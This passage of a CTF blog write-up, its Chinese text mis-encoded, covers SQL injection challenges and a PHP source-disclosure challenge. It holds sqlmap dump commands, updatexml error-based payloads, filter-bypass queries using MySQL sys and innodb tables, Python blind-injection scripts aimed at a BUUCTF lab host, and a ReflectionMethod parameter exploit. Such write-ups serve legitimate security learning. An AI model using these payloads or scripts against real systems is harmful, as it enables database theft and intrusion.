plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot; 1.txt&quot; â€“dump -D â€œsecurityâ€</span><br></pre></td></tr></table></figure><p>æš´åˆ—å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1&#39;) ||updatexml(&quot;~&quot;,concat(&quot;~&quot;,(select * from (select * from flag as a join flag b)c)),&quot;~&quot;)%23&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p>å¾—flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1&#39;)||updatexml(1,((select &#96;e4f94828-d693-4ea1-8759-051b98824ce3&#96; from flag limit 0,1)),1)%23&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p><strong>æ–°å§¿åŠ¿&amp;&amp;ä¸è¶³</strong></p><ol><li>å½“information_schemaè¢«è¿‡æ»¤ï¼Œæ— æ³•æŸ¥åº“ä¸­è¡¨å’Œåˆ—æ—¶ï¼Œå¯ä»¥ç”¨<code>sys.schema_table_statistics_with_buffer</code>ã€<code>sys.x$schema_flattened_keys</code> ç­‰æ¥çˆ†è¡¨ã€‚</li><li>å½“åˆ—åä¸çŸ¥é“æ—¶ï¼Œä¸€èˆ¬åˆ©ç”¨information_schema_columnsï¼›å†è€…å¯åˆ©ç”¨joinè¿›è¡Œæ— åˆ—åæ³¨å…¥å¾—åˆ°åˆ—åï¼›è‹¥åœ¨joinè¢«è¿‡æ»¤æˆ–ç›²æ³¨ç­‰æƒ…å†µï¼Œæ­¤æ—¶åˆ™å¯ä»¥è€ƒè™‘mysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒå¤§å°ã€‚</li><li>å½“<code>||</code> ã€<code>or</code> ç­‰å¸¸ç”¨å­—ç¬¦è¿‡æ»¤æ—¶ä¹Ÿè®¸å¯ä»¥ä½¿ç”¨ <code>^</code> å¼‚æˆ–è¿™ä¸ªç¬¦å·ï¼Œå¦‚<code>?id=1&#39;^(payload)^1--+</code></li><li>postä¼ å‚çš„Pythonè„šæœ¬ç¼–å†™å¾…åŠ å¼º</li></ol><h3 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass information_schema"></a>bypass information_schema</h3><blockquote><p>Mysql5.7åæ–°å¢äº†sysåº“ï¼Œå…¶åŸºç¡€æ•°æ®æ¥è‡ªäºperformance_chemaå’Œinformation_schemaä¸¤ä¸ªåº“ï¼Œæœ¬èº«æ•°æ®åº“ä¸å­˜å‚¨æ•°æ®ã€‚å¯é€šè¿‡sysåº“å–ä»£information_schemaè·å–è¡¨åã€‚</p></blockquote><p>sys ä¸­å¯åˆ©ç”¨çš„è§†å›¾</p><ul><li><strong>sys.schema_table_statistics_with_buffer</strong></li><li><strong>sys.x$schema_table_statistics_with_buffer</strong></li><li><strong>sys.schema_auto_increment_columns</strong></li><li><strong>sys.x$ps_schema_table_statistics_io</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><p>å½“orè¢«è¿‡æ»¤ï¼ˆæ²¡è¿‡æ»¤inï¼‰æ—¶ï¼Œå¯åˆ©ç”¨innodbå­˜å‚¨å¼•æ“è·å–è¡¨å</p><ul><li><strong>mysql.innodb_table_stats</strong> (æ­¤è¡¨ä¸­åº“åå­—æ®µæ˜¯database_nameï¼Œè€Œétable_schema)</li><li><strong>mysql.innodb_index_stats</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h3 id="join"><a href="#join" class="headerlink" title="join"></a>join</h3><p>é€šè¿‡joinè¿›è¡Œæ— åˆ—åæ³¨å…¥è·å–åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b)c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;id&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;username&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,username))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure><p>åœ¨å­¦ä¹ å¤§ä½¬wpæ—¶è¿˜çœ‹åˆ°åˆ©ç”¨joinç»•è¿‡é€—å·è¿‡æ»¤ï¼Œtql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p>ä¸ç”¨é€—å·</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select * from (select 1)a join (select 2)b join (select 3)c--+</span></span><br></pre></td></tr></table></figure><h3 id="mysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒ"><a href="#mysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒ" class="headerlink" title="mysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒ"></a>mysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒ</h3><p>ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œä¼šå„å–ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é¦–å­—ç¬¦asciiç æ¥æ¯”è¾ƒï¼Œå¦‚ä¸‹å›¾</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517195727369.png" alt="image-20210517195727369"></p><p>ç”±æ­¤å¯çŸ¥åä¸€å­—ç¬¦ä¸²é¦–ä½ä¸ºfï¼Œè‹¥é¦–ä½ç›¸åŒï¼Œåˆ™ä¼šæ¯”è¾ƒä¸‹ä¸€ä½ï¼Œä»¥æ­¤ç±»æ¨ä¾¿å¯å¾—åˆ°åä¸€å­—ç¬¦ä¸²å†…å®¹ã€‚</p><p>ä½†mysqlæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼æœ¬åº”æ˜¯B(66)&lt;a(97)</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517210315933.png" alt="image-20210517210315933"></p><p>æ€ä¹ˆèƒ½è¾¾åˆ°åŒºåˆ†å¤§å°å†™çš„æ•ˆæœå‘¢ï¼Ÿæˆ‘åœ¨è¿™ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°ç­”æ¡ˆï¼ˆå¤§ä½¬tqlï¼ï¼‰</p><p><a href="https://nosec.org/home/detail/3830.html">æ— éœ€â€œinâ€çš„SQLç›²æ³¨</a></p><p>å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼åï¼Œä¼šå¼ºåˆ¶è¿›è¡Œå­—èŠ‚å¯¹å­—èŠ‚çš„æ¯”è¾ƒ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517215444478.png" alt="image-20210517215444478"></p><p>ä½†binaryå‡½æ•°ä¸­çš„inè¢«è¿‡æ»¤äº†ï¼Œæ— æ³•ä½¿ç”¨ã€‚</p><p>æ–°çš„æ–¹æ³•æ˜¯ç”¨concatæ‹¼æ¥ä¸€ä¸ªJSONå¯¹è±¡ï¼Œå³<code>select concat(&#39;B&#39;,cast(0 as json))</code>ä¹Ÿä¼šè¿”å›ä¸€äºŒè¿›åˆ¶å­—ç¬¦ä¸²</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517222742475.png" alt="image-20210517222742475"></p><p>ä¹Ÿå¯ä»¥æŠŠå­—ç¬¦è½¬åŒ–ä¸ºåå…­è¿›åˆ¶åæ¯”è¾ƒï¼ŒB(0x42)&lt;a</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>ç”±äºé¢˜ç›®ç¯å¢ƒå·²å…³ï¼Œè¿™é‡Œåœ¨BUUCTFæ‰¾åˆ°äº†ä¸€é“ç±»ä¼¼çš„é¢˜ä»¥ç»ƒä¹ ã€‚</p><p>[GYCTF2020]Ezsqli</p><p>fuzzåï¼Œå‘ç°è¿™é‡Œä¹Ÿè¿‡æ»¤äº†informationï¼Œè€ƒè™‘åˆ©ç”¨sys</p><p>ç®€å•å°è¯•åï¼Œå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œä¹Ÿæ²¡æœ‰æŠ¥é”™ï¼Œå½“è¯­å¥ä¸ºçœŸæ—¶è¿”å›Nu1Lï¼Œä¸ºå‡æ—¶è¿”å›V&amp;Nï¼Œè€ƒè™‘å¸ƒå°”ç›²æ³¨ã€‚</p><p>åˆ¤æ–­è¡¨å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://ead240c2-1793-45a6-8939-a0db7ad04826.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))=&#123;&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        py = payload.<span class="built_in">format</span>(j,i)</span><br><span class="line">        post_data = &#123;<span class="string">&#x27;id&#x27;</span>: py&#125;</span><br><span class="line">        re = requests.post(url, data=post_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            result += <span class="built_in">chr</span>(i)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸¤ä¸ªè¡¨ï¼Œusers233333333333333,f1ag_1s_h3r3_hhhhh</p><p>ç”±äºè¿‡æ»¤äº†joinï¼Œæ— æ³•çŸ¥é“åˆ—åï¼Œé‡‡ç”¨mysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒæ¥è·å–ç¬¬äºŒä¸ªè¡¨çš„å†…å®¹ã€‚</p><p>åˆ¤æ–­è¡¨ä¸­æœ‰ä¸¤ä¸ªå­—æ®µï¼ŒçŒœæµ‹flagåœ¨ç¬¬äºŒåˆ—ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2||((select 1)&gt;(select * from f1ag_1s_h3r3_hhhhh))      bool(false)</span><br><span class="line">id&#x3D;2||((select 1ï¼Œ1)&gt;(select * from f1ag_1s_h3r3_hhhhh))    Nu1l</span><br><span class="line">id&#x3D;2||((select 1,1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))   bool(false)</span><br></pre></td></tr></table></figure><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ead240c2-1793-45a6-8939-a0db7ad04826.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">&quot;2||((select 1,&#123;&#125;) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(str_hex(flag+<span class="built_in">chr</span>(j)))</span><br><span class="line">        <span class="comment">#payload=&quot;2||((select 1,(concat(&#123;&#125;,cast(0 as json)))) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;.format(flag+chr(j))</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> flag[-<span class="number">1</span>] ==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>wpå‚è€ƒ <a href="https://r0yanx.com/2020/10/28/fslh-writeup/">fslh-writeup</a></p><p>æ‰«æåå°ç›®å½•å¾—åˆ°index.php.swpï¼Œå°‘è§çš„å¤‡ä»½æ–‡ä»¶æ ¼å¼ï¼Œå…¶æ˜¯ vim æ‰“å¼€æ–‡ä»¶åçš„ç¼“å­˜æ–‡ä»¶<br>å¾—åˆ°æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);</span><br><span class="line">var_dump(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure><p>åˆ†æé¢˜ç›®ï¼ŒçŒœæµ‹ flag æ˜¯è—åœ¨ç±»çš„æ³¨é‡Šä¸­ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå®ä¾‹åŒ–ä»»æ„ç±»ï¼Œå¹¶è°ƒç”¨ç±»æ–¹æ³•ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨ PHP å†…ç½®ç±»ä¸­çš„ <code>ReflectionMethod</code> æ¥è¯»å– <code>User</code> ç±»é‡Œé¢å„ä¸ªå‡½æ•°çš„æ³¨é‡Šã€‚</p><p>æ„é€ æˆé¢˜ç›®ä¸­çš„ http å‚æ•°åˆ™æ˜¯ï¼š<code>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code></p><p>å› ä¸ºä¸çŸ¥é“æ˜¯åœ¨å“ªä¸ªå‡½æ•°çš„æ³¨é‡Šä¸­ï¼Œæ‰€ä»¥é€ä¸ªå‡½æ•°æš´ç ´ï¼Œæš´ç ´ <code>rb</code> çš„å€¼ <code>a-z</code>ï¼Œå¯ä»¥å‘ç° <code>flag</code> åœ¨ <code>q</code> çš„æ³¨é‡Šä¸­ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1223846800.png" alt="1223846800"></p><p>å…¶ä»–é¢˜ç›®è´¨é‡å¾ˆä¸é”™ï¼ˆçˆ†0ï¼‰ï¼Œæ ¹æœ¬æ²¡æœ‰æ€è·¯ï¼Œå¤§ä½¬çš„wpå¦‚ä¸‹ï¼š</p><p><a href="http://www.xl-bit.cn/index.php/archives/434/">http://www.xl-bit.cn/index.php/archives/434/</a></p><p><a href="http://www.snowywar.top/?p=2190">http://www.snowywar.top/?p=2190</a></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p>[1] <a href="https://www.anquanke.com/post/id/193512">èŠä¸€èŠbypass information_schema</a></p><p>[2] <a href="https://www.136.la/mysql/show-47821.html">SQLi â€”â€” é€—å·ï¼Œç©ºæ ¼ï¼Œå­—æ®µåè¿‡æ»¤çªç ´(ç¤ºä¾‹ä»£ç )</a></p><p>[3] <a href="https://blog.csdn.net/weixin_45669205/article/details/116064642?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">[GYCTF2020]Ezsqliï¼ˆMysqlé€ä½æ¯”è¾ƒï¼‰</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ciscn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ æ¼æ´å­¦ä¹ </title>
      <link href="posts/13382.html"/>
      <url>posts/13382.html</url>
      
